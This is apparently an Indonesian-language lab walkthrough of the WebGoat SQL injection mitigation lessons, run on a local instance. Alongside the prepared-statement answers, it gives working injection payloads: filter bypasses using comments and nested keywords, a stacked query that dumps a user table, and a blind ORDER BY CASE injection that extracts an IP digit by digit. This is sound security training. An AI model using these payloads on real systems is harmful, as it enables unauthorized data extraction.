# SQL Injection (mitigation)
Ini adalah pertahanan terbaik terhadap SQL injection, yaitu dengan data sebagai satu kesatuan yang terikat pada kolom tanpa interpretasi. 

## Try it! Writing safe code
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/4 masukkan jawaban sebagai berikut
```sh
getConnection
PreparedStatement
prepareStatement
?
?
statement.setString(1, name)
statement.setString(2, mail)
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%202.JPG)

## Try it! Writing safe code
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/5 dan tuliskan source code berikut ini kemudian tekan tombol **Submit**
```sh
try {
    Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
    PreparedStatement statement = conn.prepareStatement("SELECT status FROM users WHERE name=? AND mail=?");
    statement.setString(1, "name");
    statement.setString(2, "mail");
    statement.executeUpdate();
} catch (Exception e) {
    System.out.println("Oops. Something went wrong!");
}
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%204.JPG)

## Input validation alone is not enough!!
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/8
- Ketikkan query injection berikut ini kemudian tekan tombol **Get Account Info**
```sh
a' or '1'='1
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%206.JPG)

- Setelah diinput, muncul keterangan bahwa inputan spasi tidak diperbolehkan. Kita bisa menggantinya dengan tanda komen `/**/` sehingga query injection menjadi sebagai berikut ini. Inputkan query berikut kemudian tekan tombol **Get Account Info**
```sh
a'/**/or/**/'1'='1
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%207.JPG)

- Query injection tersebut ternyata berhasil. Sekarang kita tinggal membuat query injection untuk menampilkan seluruh data di tabel **user_system_data**
```sh
a';/**/select/**/*/**/from/**/user_system_data;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%208.JPG)

## Input validation alone is not enough!!
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/9
- Kita bisa mencoba menginputkan query injection di task sebelumnya
```sh
a';/**/select/**/*/**/from/**/user_system_data;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%209.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2010.JPG)

- Terlihat disini bawah semua string yang berhubungan dengan syntak SQL akan dihapus. Jadi kita bisa mengubahnya menjadi seperti berikut ini, dimana ketika string yang berhubungan syntak dihapus, akan tetap terbentuk query injection diatas
```sh
a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2011.JPG)

## Order by clause
- Jalankan tool Burp Suite
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/11 dan klik kolom IP

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2012.JPG)

- Buka Burp Suite dan cari request yang mengarah ke path URL **/WebGoat/SqlInjectionMitigations/servers?column=ip** lalu klik kanan pada request tersebut dan pilih Send to Repeater

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2013.JPG)

- Pindah ke tab Repeater lalu tekan tombol **Send**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2014.JPG)

- Tambahkan tanda petik pada parameter kolom

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2015.JPG)

- Lalu tekan tombol **Send**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2016.JPG)

- Sekarang kita injeksikan query berikut ini kemudian tekan tombol **Send**
```sh
(CASE+WHEN+(SELECT+hostname+FROM+servers+WHERE+hostname='webgoat-dev')+=+'webgoat-dev'+THEN+id+ELSE+status+END)
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2017.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2018.JPG)

- Sekarang kita coba ubah query injeksinya menjadi seperti berikut
```sh
(CASE+WHEN+(SELECT+hostname+FROM+servers+WHERE+hostname='webgoat-dev')+=+'webgoat-xyz'+THEN+id+ELSE+status+END)
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2019.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2020.JPG)

- Dari hasil diatas dapat kita lihat, jika query injection bernilai `true` maka data akan diurutkan berdasarkan id dan jika bernilai `false` data akan diurutkan berdasarkan status. Jadi kita gunakan acuan ini untuk mengecek berapa IP dari hostname `webgoat-prd`. Pertama kita cek digit paling depan dengan query injection berikut
```sh
(CASE+WHEN+(SELECT+substring(ip,1,1)+FROM+servers+WHERE+hostname='webgoat-prd')+=+'1'+THEN+id+ELSE+status+END)
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2021.JPG)

- Digit paling depan adalah angka `1` sekarang kita cek angka berikutnya
```sh
(CASE+WHEN+(SELECT+substring(ip,2,1)+FROM+servers+WHERE+hostname='webgoat-prd')+=+'0'+THEN+id+ELSE+status+END)
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2022.JPG)

- Digit selanjutnya adalah angka `0` sekarang tinggal cek angka di digit ke 3
```sh
(CASE+WHEN+(SELECT+substring(ip,3,1)+FROM+servers+WHERE+hostname='webgoat-prd')+=+'4'+THEN+id+ELSE+status+END)
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2023.JPG)

- Digit ke-3 adalah angka `4`. Jadi IP webgoat-prd di block pertama adalah `104`. Di petunjuk soal, 3 block terakhir IP webgoat-prd adalah `130.219.202`. Jadi IP lengkap webgoat-prd adalah
```sh
104.130.219.202
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2024.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2025.JPG)